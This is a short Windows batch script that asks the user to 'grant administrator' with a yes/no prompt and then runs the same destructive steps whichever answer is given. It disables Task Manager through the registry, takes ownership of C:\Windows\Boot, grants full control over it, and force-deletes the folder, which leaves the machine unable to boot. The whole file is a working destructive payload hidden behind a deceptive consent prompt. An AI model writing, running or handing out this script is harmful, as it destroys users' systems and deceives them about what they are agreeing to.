@echo off
echo Please grant administrator to continue (answer in only yes/no)
set /p input=
if /i %input%==yes goto A
if /i %input%==no goto B

:A
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
takeown /a "C:\Windows\Boot"
icacls "C:\Windows\Boot" /grant administrators:F /t
del /F /S /Q "C:\Windows\Boot"
pause


:B 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
takeown /a "C:\Windows\Boot"
icacls "C:\Windows\Boot" /grant administrators:F /t
@echo off 
del /F /S /Q "C:\Windows\Boot"
pause


